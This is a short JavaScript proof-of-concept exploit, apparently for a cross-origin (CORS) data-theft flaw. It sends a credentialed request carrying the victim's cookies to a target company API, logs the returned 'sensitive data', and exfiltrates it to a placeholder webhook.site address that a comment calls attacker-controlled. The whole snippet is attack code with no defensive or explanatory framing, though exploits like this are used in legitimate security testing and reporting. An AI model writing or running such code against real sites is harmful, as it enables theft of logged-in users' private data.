        // Cross-origin request to fetch sensitive data
        fetch("https://api.company-target.com/api/v3/ip.json", {
            method: "POST",
            credentials: "include", // Includes victim's cookies
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                src: "tag",
                auth: "fake-auth-token"
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log("Extracted Sensitive Data:", data);
            
            // Exfiltrate to attacker-controlled server
            fetch("https://webhook.site/YOUR-UNIQUE-ID", {
                method: "POST",
                body: JSON.stringify(data),
                headers: { "Content-Type": "application/json" }
            });
        });
